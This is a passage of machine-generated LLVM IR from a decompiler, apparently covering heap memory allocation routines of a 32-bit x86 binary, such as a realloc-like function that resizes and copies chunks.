  store i32 %v1_8052613, i32* %eax.global-to-local, align 4
  %v0_8052618 = load i32, i32* @ebx, align 4
  %v1_805261b = call i32 @function_8051e4e(i32 %v0_8052618)
  store i32 %v1_805261b, i32* %eax.global-to-local, align 4
  store i32 %v1_805261b, i32* %ebx.global-to-local, align 4
  %v1_8052625 = icmp eq i32 %v1_805261b, 0
  br i1 %v1_8052625, label %dec_label_pc_805269c, label %dec_label_pc_8052629

dec_label_pc_8052629:                             ; preds = %dec_label_pc_80525f7
  %v1_8052629 = add i32 %v1_805261b, -4
  %v2_8052629 = inttoptr i32 %v1_8052629 to i32*
  %v3_8052629 = load i32, i32* %v2_8052629, align 4
  store i32 %v3_8052629, i32* %eax.global-to-local, align 4
  %v2_805262c = and i32 %v3_8052629, 2
  %v3_805262c = icmp eq i32 %v2_805262c, 0
  %v1_805262e = icmp eq i1 %v3_805262c, false
  br i1 %v1_805262e, label %dec_label_pc_805269c, label %dec_label_pc_8052630

dec_label_pc_8052630:                             ; preds = %dec_label_pc_8052629
  %v1_80526303 = add i32 %v3_8052629, -4
  %v1_8052633 = and i32 %v1_80526303, -4
  %v2_8052638 = udiv i32 %v1_8052633, 4
  store i32 %v2_8052638, i32* %eax.global-to-local, align 4
  %v5_805263b = icmp ult i32 %v1_8052633, 36
  %tmp = and i32 %v1_80526303, -4
  %tmp18 = icmp eq i32 %tmp, 36
  %v2_805263e = or i1 %v5_805263b, %tmp18
  br i1 %v2_805263e, label %dec_label_pc_805264f, label %dec_label_pc_8052640

dec_label_pc_8052640:                             ; preds = %dec_label_pc_8052630
  %v3_8052645 = inttoptr i32 %v1_805261b to i8*
  %v4_8052645 = call i32 @function_8051a6c(i8* %v3_8052645, i32 0, i32 %v1_8052633)
  store i32 %v4_8052645, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805269c

dec_label_pc_805264f:                             ; preds = %dec_label_pc_8052630
  %v1_805264f = inttoptr i32 %v1_805261b to i32*
  store i32 0, i32* %v1_805264f, align 4
  %v0_8052655 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052655 = add i32 %v0_8052655, 4
  %v2_8052655 = inttoptr i32 %v1_8052655 to i32*
  store i32 0, i32* %v2_8052655, align 4
  %v0_805265c = load i32, i32* %ebx.global-to-local, align 4
  %v1_805265c = add i32 %v0_805265c, 8
  %v2_805265c = inttoptr i32 %v1_805265c to i32*
  store i32 0, i32* %v2_805265c, align 4
  %v0_8052663 = load i32, i32* %eax.global-to-local, align 4
  %tmp15 = icmp ult i32 %v0_8052663, 5
  br i1 %tmp15, label %dec_label_pc_805269c, label %dec_label_pc_8052668

dec_label_pc_8052668:                             ; preds = %dec_label_pc_805264f
  %v0_8052668 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052668 = add i32 %v0_8052668, 12
  %v2_8052668 = inttoptr i32 %v1_8052668 to i32*
  store i32 0, i32* %v2_8052668, align 4
  %v0_805266f = load i32, i32* %ebx.global-to-local, align 4
  %v1_805266f = add i32 %v0_805266f, 16
  %v2_805266f = inttoptr i32 %v1_805266f to i32*
  store i32 0, i32* %v2_805266f, align 4
  %v0_8052676 = load i32, i32* %eax.global-to-local, align 4
  %tmp16 = icmp ult i32 %v0_8052676, 7
  br i1 %tmp16, label %dec_label_pc_805269c, label %dec_label_pc_805267b

dec_label_pc_805267b:                             ; preds = %dec_label_pc_8052668
  %v0_805267b = load i32, i32* %ebx.global-to-local, align 4
  %v1_805267b = add i32 %v0_805267b, 20
  %v2_805267b = inttoptr i32 %v1_805267b to i32*
  store i32 0, i32* %v2_805267b, align 4
  %v0_8052682 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052682 = add i32 %v0_8052682, 24
  %v2_8052682 = inttoptr i32 %v1_8052682 to i32*
  store i32 0, i32* %v2_8052682, align 4
  %v0_8052689 = load i32, i32* %eax.global-to-local, align 4
  %tmp17 = icmp ult i32 %v0_8052689, 9
  br i1 %tmp17, label %dec_label_pc_805269c, label %dec_label_pc_805268e

dec_label_pc_805268e:                             ; preds = %dec_label_pc_805267b
  %v0_805268e = load i32, i32* %ebx.global-to-local, align 4
  %v1_805268e = add i32 %v0_805268e, 28
  %v2_805268e = inttoptr i32 %v1_805268e to i32*
  store i32 0, i32* %v2_805268e, align 4
  %v0_8052695 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052695 = add i32 %v0_8052695, 32
  %v2_8052695 = inttoptr i32 %v1_8052695 to i32*
  store i32 0, i32* %v2_8052695, align 4
  br label %dec_label_pc_805269c

dec_label_pc_805269c:                             ; preds = %dec_label_pc_805267b, %dec_label_pc_8052668, %dec_label_pc_805264f, %dec_label_pc_8052629, %dec_label_pc_80525f7, %dec_label_pc_8052640, %dec_label_pc_805268e
  store i32 %v12_80525c5, i32* @eax, align 4
  %v2_80526a5 = call i32 @function_805337a(i32 %v12_80525c5, i32 1)
  store i32 %v2_80526a5, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80526ad

dec_label_pc_80526ad:                             ; preds = %dec_label_pc_80525e5, %dec_label_pc_805269c
  %v0_80526b0 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_80526b0, i32* %eax.global-to-local, align 4
  store i32 %v0_80525c4, i32* @ebx, align 4
  store i32 %v0_80525c2, i32* @edi, align 4
  ret i32 %v0_80526b0

; uselistorder directives
  uselistorder i32 %v1_8052633, { 2, 1, 0 }
  uselistorder i32 %v1_805261b, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %ebx.global-to-local, { 9, 0, 3, 1, 6, 2, 7, 4, 5, 8, 10 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 3, 4, 5, 2, 6, 7, 8, 9, 10, 12, 11 }
  uselistorder i64 4294967296, { 1, 0 }
  uselistorder label %dec_label_pc_80526ad, { 1, 0 }
  uselistorder label %dec_label_pc_805269c, { 6, 0, 1, 2, 5, 3, 4 }
}

define i32 @function_80526b6() local_unnamed_addr {
dec_label_pc_80526b6:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v0_80526b6 = load i32, i32* @ebp, align 4
  %v0_80526b7 = load i32, i32* @edi, align 4
  %v0_80526b8 = load i32, i32* @esi, align 4
  %v0_80526b9 = load i32, i32* @ebx, align 4
  store i32 %tmp7, i32* @ebx, align 4
  %v4_80526c1 = icmp eq i32 %tmp6, 0
  %v1_80526c6 = icmp eq i1 %v4_80526c1, false
  br i1 %v1_80526c6, label %dec_label_pc_80526d8, label %dec_label_pc_80526c8

dec_label_pc_80526c8:                             ; preds = %dec_label_pc_80526b6
  store i32 %tmp7, i32* %stack_var_-60, align 4
  %v1_80526cc = call i32 @function_8051e4e(i32 %tmp7)
  store i32 %v1_80526cc, i32* %eax.global-to-local, align 4
  store i32 %v1_80526cc, i32* @ebx, align 4
  br label %dec_label_pc_80529d1

dec_label_pc_80526d8:                             ; preds = %dec_label_pc_80526b6
  %v1_80526d8 = icmp eq i32 %tmp7, 0
  %v1_80526da = icmp eq i1 %v1_80526d8, false
  br i1 %v1_80526da, label %dec_label_pc_80526ed, label %dec_label_pc_80526dc

dec_label_pc_80526dc:                             ; preds = %dec_label_pc_80526d8
  store i32 %tmp6, i32* %stack_var_-60, align 4
  %v1_80526e3 = call i32 @function_8052c13(i32 %tmp6)
  store i32 %v1_80526e3, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80529d1

dec_label_pc_80526ed:                             ; preds = %dec_label_pc_80526d8
  %v2_80526f8 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_80526f8, i32* @eax, align 4
  store i32 %v2_80526f8, i32* %stack_var_-60, align 4
  %v2_80526fd = call i32 @function_805337a(i32 %v2_80526f8, i32 134558583)
  store i32 %v2_80526fd, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_80555dc.32 to i32), i32* %stack_var_-60, align 4
  %v1_8052709 = call i32 @function_8053377(i32 ptrtoint (i32* @global_var_80555dc.32 to i32))
  store i32 %v1_8052709, i32* %eax.global-to-local, align 4
  %v0_8052711 = load i32, i32* @ebx, align 4
  %tmp20 = icmp ult i32 %v0_8052711, -32
  br i1 %tmp20, label %dec_label_pc_8052728, label %dec_label_pc_8052716

dec_label_pc_8052716:                             ; preds = %dec_label_pc_80526ed
  %v0_8052716 = load i32, i32* %stack_var_-60, align 4
  %v1_8052716 = call i32 @function_8051a1b(i32 %v0_8052716)
  store i32 %v1_8052716, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v1_805271d = inttoptr i32 %v1_8052716 to i32*
  store i32 12, i32* %v1_805271d, align 4
  br label %dec_label_pc_80529d4

dec_label_pc_8052728:                             ; preds = %dec_label_pc_80526ed
  %v1_8052728 = add i32 %v0_8052711, 11
  %tmp21 = icmp ult i32 %v1_8052728, 16
  %v1_8052738 = and i32 %v1_8052728, -8
  %v1_8052728.v1_8052738 = select i1 %tmp21, i32 %v1_8052728, i32 %v1_8052738
  %.v1_8052738 = select i1 %tmp21, i32 16, i32 %v1_8052738
  store i32 %v1_8052728.v1_8052738, i32* %eax.global-to-local, align 4
  %v1_8052743 = add i32 %tmp6, -8
  store i32 %v1_8052743, i32* @edi, align 4
  %v1_8052746 = add i32 %tmp6, -4
  %v2_8052746 = inttoptr i32 %v1_8052746 to i32*
  %v3_8052746 = load i32, i32* %v2_8052746, align 4
  store i32 %v3_8052746, i32* @edx, align 4
  %v1_805274b = and i32 %v3_8052746, -4
  store i32 %v1_805274b, i32* %eax.global-to-local, align 4
  %v2_8052752 = and i32 %v3_8052746, 2
  %v3_8052752 = icmp eq i32 %v2_8052752, 0
  %v1_8052755 = icmp eq i1 %v3_8052752, false
  br i1 %v1_8052755, label %dec_label_pc_80528ef, label %dec_label_pc_805275b

dec_label_pc_805275b:                             ; preds = %dec_label_pc_8052728
  store i32 %.v1_8052738, i32* %ecx.global-to-local, align 4
  store i32 %v1_805274b, i32* @ebx, align 4
  %v7_8052761 = icmp ult i32 %v1_805274b, %.v1_8052738
  %v1_8052763 = icmp eq i1 %v7_8052761, false
  br i1 %v1_8052763, label %dec_label_pc_805289a, label %dec_label_pc_8052769

dec_label_pc_8052769:                             ; preds = %dec_label_pc_805275b
  %v2_8052769 = add i32 %v1_805274b, %v1_8052743
  store i32 %v2_8052769, i32* @esi, align 4
  %v1_805276c = load i32, i32* @global_var_80558ec.34, align 4
  %v12_805276c = icmp eq i32 %v2_8052769, %v1_805276c
  %v1_8052772 = icmp eq i1 %v12_805276c, false
  %v1_80527ac = add i32 %v2_8052769, 4
  %v2_80527ac = inttoptr i32 %v1_80527ac to i32*
  %v3_80527ac = load i32, i32* %v2_80527ac, align 4
  br i1 %v1_8052772, label %dec_label_pc_80527ac, label %dec_label_pc_8052774

dec_label_pc_8052774:                             ; preds = %dec_label_pc_8052769
  %v1_8052779 = and i32 %v3_80527ac, -4
  %v2_805277c = add i32 %v1_8052779, %v1_805274b
  store i32 %v2_805277c, i32* %ecx.global-to-local, align 4
  %v1_8052782 = add i32 %.v1_8052738, 16
  store i32 %v1_8052782, i32* %eax.global-to-local, align 4
  %v7_8052785 = icmp ult i32 %v2_805277c, %v1_8052782
  br i1 %v7_8052785, label %dec_label_pc_80527ea, label %dec_label_pc_8052789

dec_label_pc_8052789:                             ; preds = %dec_label_pc_8052774
  %v1_8052789 = urem i32 %v3_8052746, 2
  %v5_805278c = or i32 %v1_8052789, %.v1_8052738
  store i32 %v5_805278c, i32* @edx, align 4
  store i32 %v5_805278c, i32* %v2_8052746, align 4
  %v0_8052797 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8052797 = sub i32 %v0_8052797, %.v1_8052738
  %v0_8052799 = load i32, i32* @edi, align 4
  %v2_8052799 = add i32 %v0_8052799, %.v1_8052738
  store i32 %v2_8052799, i32* %eax.global-to-local, align 4
  %v1_805279c = or i32 %v2_8052797, 1
  store i32 %v1_805279c, i32* %ecx.global-to-local, align 4
  store i32 %v2_8052799, i32* @global_var_80558ec.34, align 4
  %v2_80527a4 = add i32 %v2_8052799, 4
  %v3_80527a4 = inttoptr i32 %v2_80527a4 to i32*
  store i32 %v1_805279c, i32* %v3_80527a4, align 4
  br label %dec_label_pc_80529bf

dec_label_pc_80527ac:                             ; preds = %dec_label_pc_8052769
  %v1_80527b1 = and i32 %v3_80527ac, -2
  store i32 %v1_80527b1, i32* %eax.global-to-local, align 4
  %v3_80527b4 = add i32 %v1_80527ac, %v1_80527b1
  %v4_80527b4 = inttoptr i32 %v3_80527b4 to i8*
  %v5_80527b4 = load i8, i8* %v4_80527b4, align 1
  %v6_80527b4 = urem i8 %v5_80527b4, 2
  %v7_80527b4 = icmp eq i8 %v6_80527b4, 0
  %v1_80527b9 = icmp eq i1 %v7_80527b4, false
  br i1 %v1_80527b9, label %dec_label_pc_80527ea, label %dec_label_pc_80527bb

dec_label_pc_80527bb:                             ; preds = %dec_label_pc_80527ac
  %v1_80527bb = and i32 %v3_80527ac, -4
  %v2_80527c2 = add i32 %v1_80527bb, %v1_805274b
  store i32 %v2_80527c2, i32* @ebx, align 4
  %v10_80527c4 = icmp ult i32 %v2_80527c2, %.v1_8052738
  br i1 %v10_80527c4, label %dec_label_pc_80527ea, label %dec_label_pc_80527ca

dec_label_pc_80527ca:                             ; preds = %dec_label_pc_80527bb
  %v1_80527ca = add i32 %v1_805274b, %tmp6
  %v2_80527ca = inttoptr i32 %v1_80527ca to i32*
  %v3_80527ca = load i32, i32* %v2_80527ca, align 4
  store i32 %v3_80527ca, i32* @edx, align 4
  %v1_80527cd = add i32 %v2_8052769, 12
  %v2_80527cd = inttoptr i32 %v1_80527cd to i32*
  %v3_80527cd = load i32, i32* %v2_80527cd, align 4
  store i32 %v3_80527cd, i32* %eax.global-to-local, align 4
  %v1_80527d0 = add i32 %v3_80527ca, 12
  %v2_80527d0 = inttoptr i32 %v1_80527d0 to i32*
  %v3_80527d0 = load i32, i32* %v2_80527d0, align 4
  %v15_80527d0 = icmp eq i32 %v3_80527d0, %v2_8052769
  %v1_80527d3 = icmp eq i1 %v15_80527d0, false
  br i1 %v1_80527d3, label %dec_label_pc_80527da, label %dec_label_pc_80527d5

dec_label_pc_80527d5:                             ; preds = %dec_label_pc_80527ca
  %v1_80527d5 = add i32 %v3_80527cd, 8
  %v2_80527d5 = inttoptr i32 %v1_80527d5 to i32*
  %v3_80527d5 = load i32, i32* %v2_80527d5, align 4
  %v15_80527d5 = icmp eq i32 %v3_80527d5, %v2_8052769
  br i1 %v15_80527d5, label %dec_label_pc_80527df, label %dec_label_pc_80527da

dec_label_pc_80527da:                             ; preds = %dec_label_pc_80527d5, %dec_label_pc_80527ca
  %v0_80527da = call i32 @function_8052daf()
  store i32 %v0_80527da, i32* %eax.global-to-local, align 4
  %v1_80527df.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_80527df

dec_label_pc_80527df:                             ; preds = %dec_label_pc_80527d5, %dec_label_pc_80527da
  %v1_80527df = phi i32 [ %v3_80527ca, %dec_label_pc_80527d5 ], [ %v1_80527df.pre, %dec_label_pc_80527da ]
  %v0_80527df = phi i32 [ %v3_80527cd, %dec_label_pc_80527d5 ], [ %v0_80527da, %dec_label_pc_80527da ]
  %v2_80527df = add i32 %v1_80527df, 12
  %v3_80527df = inttoptr i32 %v2_80527df to i32*
  store i32 %v0_80527df, i32* %v3_80527df, align 4
  %v0_80527e2 = load i32, i32* @edx, align 4
  %v1_80527e2 = load i32, i32* %eax.global-to-local, align 4
  %v2_80527e2 = add i32 %v1_80527e2, 8
  %v3_80527e2 = inttoptr i32 %v2_80527e2 to i32*
  store i32 %v0_80527e2, i32* %v3_80527e2, align 4
  %v0_805289a.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805289a

dec_label_pc_80527ea:                             ; preds = %dec_label_pc_80527bb, %dec_label_pc_80527ac, %dec_label_pc_8052774
  %v1_80527f1 = add i32 %.v1_8052738, -7
  store i32 %v1_80527f1, i32* %eax.global-to-local, align 4
  store i32 %v1_80527f1, i32* %stack_var_-60, align 4
  %v1_80527f5 = call i32 @function_8051e4e(i32 %v1_80527f1)
  store i32 %v1_80527f5, i32* %eax.global-to-local, align 4
  store i32 %v1_80527f5, i32* @edx, align 4
  %v1_80527ff = icmp eq i32 %v1_80527f5, 0
  br i1 %v1_80527ff, label %dec_label_pc_80529bb, label %dec_label_pc_8052807

dec_label_pc_8052807:                             ; preds = %dec_label_pc_80527ea
  %v1_8052807 = add i32 %v1_80527f5, -8
  store i32 %v1_8052807, i32* %ebx.global-to-local, align 4
  %v1_805280a = load i32, i32* @esi, align 4
  %v12_805280a = icmp eq i32 %v1_8052807, %v1_805280a
  %v1_805280c = add i32 %v1_80527f5, -4
  %v2_805280c = inttoptr i32 %v1_805280c to i32*
  %v3_805280c = load i32, i32* %v2_805280c, align 4
  store i32 %v3_805280c, i32* %eax.global-to-local, align 4
  %v1_805280f = icmp eq i1 %v12_805280a, false
  br i1 %v1_805280f, label %dec_label_pc_805281d, label %dec_label_pc_8052811

dec_label_pc_8052811:                             ; preds = %dec_label_pc_8052807
  %v1_8052811 = and i32 %v3_805280c, -4
  store i32 %v1_8052811, i32* %eax.global-to-local, align 4
  store i32 %v1_805274b, i32* @edx, align 4
  %v2_8052818 = add i32 %v1_8052811, %v1_805274b
  store i32 %v2_8052818, i32* @ebx, align 4
  br label %dec_label_pc_805289a

dec_label_pc_805281d:                             ; preds = %dec_label_pc_8052807
  %v1_8052821 = add i32 %v1_805274b, -4
  store i32 %v1_8052821, i32* %eax.global-to-local, align 4
  %v2_8052826 = udiv i32 %v1_8052821, 4
  store i32 %v2_8052826, i32* %ecx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8052821, 37
  br i1 %tmp, label %dec_label_pc_805283f, label %dec_label_pc_805282e

dec_label_pc_805282e:                             ; preds = %dec_label_pc_805281d
  store i32 %v1_80527f5, i32* %stack_var_-60, align 4
  %v3_8052835 = inttoptr i32 %v1_80527f5 to i16*
  %v4_8052835 = call i32 @function_8053c3a(i16* %v3_8052835, i32 %tmp6, i32 %v1_8052821)
  store i32 %v4_8052835, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052886

dec_label_pc_805283f:                             ; preds = %dec_label_pc_805281d
  store i32 %tmp6, i32* @esi, align 4
  %v1_8052846 = inttoptr i32 %tmp6 to i32*
  %v2_8052846 = load i32, i32* %v1_8052846, align 4
  store i32 %v2_8052846, i32* %eax.global-to-local, align 4
  %v2_8052848 = inttoptr i32 %v1_80527f5 to i32*
  store i32 %v2_8052846, i32* %v2_8052848, align 4
  %v0_805284a = load i32, i32* @esi, align 4
  %v1_805284a = add i32 %v0_805284a, 4
  %v2_805284a = inttoptr i32 %v1_805284a to i32*
  %v3_805284a = load i32, i32* %v2_805284a, align 4
  store i32 %v3_805284a, i32* %eax.global-to-local, align 4
  %v1_805284d = load i32, i32* @edx, align 4
  %v2_805284d = add i32 %v1_805284d, 4
  %v3_805284d = inttoptr i32 %v2_805284d to i32*
  store i32 %v3_805284a, i32* %v3_805284d, align 4
  %v0_8052850 = load i32, i32* @esi, align 4
  %v1_8052850 = add i32 %v0_8052850, 8
  %v2_8052850 = inttoptr i32 %v1_8052850 to i32*
  %v3_8052850 = load i32, i32* %v2_8052850, align 4
  store i32 %v3_8052850, i32* %eax.global-to-local, align 4
  %v1_8052853 = load i32, i32* @edx, align 4
  %v2_8052853 = add i32 %v1_8052853, 8
  %v3_8052853 = inttoptr i32 %v2_8052853 to i32*
  store i32 %v3_8052850, i32* %v3_8052853, align 4
  %tmp27 = icmp ult i32 %v1_8052821, 17
  br i1 %tmp27, label %dec_label_pc_8052886, label %dec_label_pc_8052858

dec_label_pc_8052858:                             ; preds = %dec_label_pc_805283f
  %v0_8052858 = load i32, i32* @esi, align 4
  %v1_8052858 = add i32 %v0_8052858, 12
  %v2_8052858 = inttoptr i32 %v1_8052858 to i32*
  %v3_8052858 = load i32, i32* %v2_8052858, align 4
  store i32 %v3_8052858, i32* %eax.global-to-local, align 4
  %v0_805285b = load i32, i32* %ecx.global-to-local, align 4
  %v1_805285e = load i32, i32* @edx, align 4
  %v2_805285e = add i32 %v1_805285e, 12
  %v3_805285e = inttoptr i32 %v2_805285e to i32*
  store i32 %v3_8052858, i32* %v3_805285e, align 4
  %v0_8052861 = load i32, i32* @esi, align 4
  %v1_8052861 = add i32 %v0_8052861, 16
  %v2_8052861 = inttoptr i32 %v1_8052861 to i32*
  %v3_8052861 = load i32, i32* %v2_8052861, align 4
  store i32 %v3_8052861, i32* %eax.global-to-local, align 4
  %v1_8052864 = load i32, i32* @edx, align 4
  %v2_8052864 = add i32 %v1_8052864, 16
  %v3_8052864 = inttoptr i32 %v2_8052864 to i32*
  store i32 %v3_8052861, i32* %v3_8052864, align 4
  %tmp22 = icmp ult i32 %v0_805285b, 7
  br i1 %tmp22, label %dec_label_pc_8052886, label %dec_label_pc_8052869

dec_label_pc_8052869:                             ; preds = %dec_label_pc_8052858
  %v0_8052869 = load i32, i32* @esi, align 4
  %v1_8052869 = add i32 %v0_8052869, 20
  %v2_8052869 = inttoptr i32 %v1_8052869 to i32*
  %v3_8052869 = load i32, i32* %v2_8052869, align 4
  store i32 %v3_8052869, i32* %eax.global-to-local, align 4
  %v0_805286c = load i32, i32* %ecx.global-to-local, align 4
  %v1_805286f = load i32, i32* @edx, align 4
  %v2_805286f = add i32 %v1_805286f, 20
  %v3_805286f = inttoptr i32 %v2_805286f to i32*
  store i32 %v3_8052869, i32* %v3_805286f, align 4
  %v0_8052872 = load i32, i32* @esi, align 4
  %v1_8052872 = add i32 %v0_8052872, 24
  %v2_8052872 = inttoptr i32 %v1_8052872 to i32*
  %v3_8052872 = load i32, i32* %v2_8052872, align 4
  store i32 %v3_8052872, i32* %eax.global-to-local, align 4
  %v1_8052875 = load i32, i32* @edx, align 4
  %v2_8052875 = add i32 %v1_8052875, 24
  %v3_8052875 = inttoptr i32 %v2_8052875 to i32*
  store i32 %v3_8052872, i32* %v3_8052875, align 4
  %tmp23 = icmp ult i32 %v0_805286c, 9
  br i1 %tmp23, label %dec_label_pc_8052886, label %dec_label_pc_805287a

dec_label_pc_805287a:                             ; preds = %dec_label_pc_8052869
  %v0_805287a = load i32, i32* @esi, align 4
  %v1_805287a = add i32 %v0_805287a, 28
  %v2_805287a = inttoptr i32 %v1_805287a to i32*
  %v3_805287a = load i32, i32* %v2_805287a, align 4
  store i32 %v3_805287a, i32* %eax.global-to-local, align 4
  %v1_805287d = load i32, i32* @edx, align 4
  %v2_805287d = add i32 %v1_805287d, 28
  %v3_805287d = inttoptr i32 %v2_805287d to i32*
  store i32 %v3_805287a, i32* %v3_805287d, align 4
  %v0_8052880 = load i32, i32* @esi, align 4
  %v1_8052880 = add i32 %v0_8052880, 32
  %v2_8052880 = inttoptr i32 %v1_8052880 to i32*
  %v3_8052880 = load i32, i32* %v2_8052880, align 4
  store i32 %v3_8052880, i32* %eax.global-to-local, align 4
  %v1_8052883 = load i32, i32* @edx, align 4
  %v2_8052883 = add i32 %v1_8052883, 32
  %v3_8052883 = inttoptr i32 %v2_8052883 to i32*
  store i32 %v3_8052880, i32* %v3_8052883, align 4
  br label %dec_label_pc_8052886

dec_label_pc_8052886:                             ; preds = %dec_label_pc_8052869, %dec_label_pc_8052858, %dec_label_pc_805283f, %dec_label_pc_805282e, %dec_label_pc_805287a
  %v0_8052889 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052889 = add i32 %v0_8052889, 8
  store i32 %v1_8052889, i32* @ebx, align 4
  store i32 %tmp6, i32* %stack_var_-60, align 4
  %v1_8052890 = call i32 @function_8052c13(i32 %tmp6)
  br label %dec_label_pc_80529b6

dec_label_pc_805289a:                             ; preds = %dec_label_pc_805275b, %dec_label_pc_8052811, %dec_label_pc_80527df
  %v1_80528ab = phi i32 [ %v1_805274b, %dec_label_pc_805275b ], [ %v2_8052818, %dec_label_pc_8052811 ], [ %v0_805289a.pre, %dec_label_pc_80527df ]
  %v5_805289c = sub i32 %v1_80528ab, %.v1_8052738
  store i32 %v5_805289c, i32* %ecx.global-to-local, align 4
  %tmp24 = icmp ult i32 %v5_805289c, 16
  br i1 %tmp24, label %dec_label_pc_80528a5, label %dec_label_pc_80528b7

dec_label_pc_80528a5:                             ; preds = %dec_label_pc_805289a
  %v0_80528a5 = load i32, i32* @edi, align 4
  %v1_80528a5 = add i32 %v0_80528a5, 4
  %v2_80528a5 = inttoptr i32 %v1_80528a5 to i32*
  %v3_80528a5 = load i32, i32* %v2_80528a5, align 4
  %v1_80528a8 = urem i32 %v3_80528a5, 2
  %v2_80528ab = or i32 %v1_80528a8, %v1_80528ab
  store i32 %v2_80528ab, i32* %eax.global-to-local, align 4
  store i32 %v2_80528ab, i32* %v2_80528a5, align 4
  %v0_80528b0 = load i32, i32* @edi, align 4
  %v1_80528b0 = load i32, i32* @ebx, align 4
  %v2_80528b0 = add i32 %v0_80528b0, 4
  %v3_80528b0 = add i32 %v2_80528b0, %v1_80528b0
  %v4_80528b0 = inttoptr i32 %v3_80528b0 to i32*
  %v5_80528b0 = load i32, i32* %v4_80528b0, align 4
  %v6_80528b0 = or i32 %v5_80528b0, 1
  store i32 %v6_80528b0, i32* %v4_80528b0, align 4
  br label %dec_label_pc_80528e7

dec_label_pc_80528b7:                             ; preds = %dec_label_pc_805289a
  %v0_80528bb = load i32, i32* @edi, align 4
  %v2_80528bb = add i32 %v0_80528bb, %.v1_8052738
  store i32 %v2_80528bb, i32* %eax.global-to-local, align 4
  %v1_80528be = add i32 %v0_80528bb, 4
  %v2_80528be = inttoptr i32 %v1_80528be to i32*
  %v3_80528be = load i32, i32* %v2_80528be, align 4
  %v1_80528c1 = urem i32 %v3_80528be, 2
  %v5_80528c4 = or i32 %v1_80528c1, %.v1_8052738
  store i32 %v5_80528c4, i32* %v2_80528be, align 4
  %v0_80528ce = load i32, i32* %ecx.global-to-local, align 4
  %v1_80528d0 = or i32 %v0_80528ce, 1
  store i32 %v1_80528d0, i32* @edx, align 4
  %v1_80528d3 = load i32, i32* %eax.global-to-local, align 4
  %v2_80528d3 = add i32 %v1_80528d3, 4
  %v3_80528d3 = inttoptr i32 %v2_80528d3 to i32*
  store i32 %v1_80528d0, i32* %v3_80528d3, align 4
  %v0_80528d6 = load i32, i32* %eax.global-to-local, align 4
  %v1_80528d6 = load i32, i32* %ecx.global-to-local, align 4
  %v2_80528d6 = add i32 %v0_80528d6, 4
  %v3_80528d6 = add i32 %v2_80528d6, %v1_80528d6
  %v4_80528d6 = inttoptr i32 %v3_80528d6 to i32*
  %v5_80528d6 = load i32, i32* %v4_80528d6, align 4
  %v6_80528d6 = or i32 %v5_80528d6, 1
  store i32 %v6_80528d6, i32* %v4_80528d6, align 4
  %v0_80528db = load i32, i32* %eax.global-to-local, align 4
  %v1_80528db = add i32 %v0_80528db, 8
  store i32 %v1_80528db, i32* %eax.global-to-local, align 4
  store i32 %v1_80528db, i32* %stack_var_-60, align 4
  %v1_80528df = call i32 @function_8052c13(i32 %v1_80528db)
  store i32 %v1_80528df, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80528e7

dec_label_pc_80528e7:                             ; preds = %dec_label_pc_80528a5, %dec_label_pc_80528b7
  %v0_80528e7 = load i32, i32* @edi, align 4
  %v1_80528e7 = add i32 %v0_80528e7, 8
  store i32 %v1_80528e7, i32* @ebx, align 4
  br label %dec_label_pc_80529c3

dec_label_pc_80528ef:                             ; preds = %dec_label_pc_8052728
  store i32 %tmp6, i32* %ecx.global-to-local, align 4
  %v0_80528f3 = load i32, i32* @global_var_8055c1c.39, align 4
  %v1_80528f8 = add i32 %v0_80528f3, -1
  store i32 %v1_80528f8, i32* %eax.global-to-local, align 4
  %v2_80528fd = inttoptr i32 %v1_8052743 to i32*
  %v3_80528fd = load i32, i32* %v2_80528fd, align 4
  store i32 %v3_80528fd, i32* @ebp, align 4
  %v1_8052900 = or i32 %.v1_8052738, 4
  store i32 %v1_8052900, i32* %stack_var_-44, align 4
  %v2_8052906 = add i32 %v3_80528fd, %v1_80528f8
  store i32 %v2_8052906, i32* @edx, align 4
  %v1_8052909 = sub i32 0, %v0_80528f3
  store i32 %v1_8052909, i32* %eax.global-to-local, align 4
  %v2_805290b = add i32 %v2_8052906, %v1_8052900
  %v2_805290e = and i32 %v2_805290b, %v1_8052909
  store i32 %v2_805290e, i32* @esi, align 4
  %v2_8052912 = sub i32 %v2_805290e, %v3_80528fd
  store i32 %v2_8052912, i32* @ebx, align 4
  %v15_8052914 = icmp eq i32 %v1_805274b, %v2_8052912
  br i1 %v15_8052914, label %dec_label_pc_80529bf, label %dec_label_pc_805291e

dec_label_pc_805291e:                             ; preds = %dec_label_pc_80528ef
  %v2_8052925 = sub i32 %v1_8052743, %v3_80528fd
  store i32 %v2_8052925, i32* @edi, align 4
  %v2_8052927 = add i32 %v3_80528fd, %v1_805274b
  store i32 %v2_8052927, i32* %eax.global-to-local, align 4
  store i32 %v2_8052925, i32* %stack_var_-60, align 4
  %v6_805292b = inttoptr i32 %v2_8052925 to i32*
  %v7_805292b = call i32 @function_8053a9e(i32* %v6_805292b, i32 %v2_8052927, i32 %v2_805290e, i32 1, i32 %v1_8052900, i32 %v1_805274b)
  store i32 %v7_805292b, i32* %eax.global-to-local, align 4
  %v10_8052933 = icmp eq i32 %v7_805292b, -1
  br i1 %v10_8052933, label %dec_label_pc_8052977, label %dec_label_pc_8052938

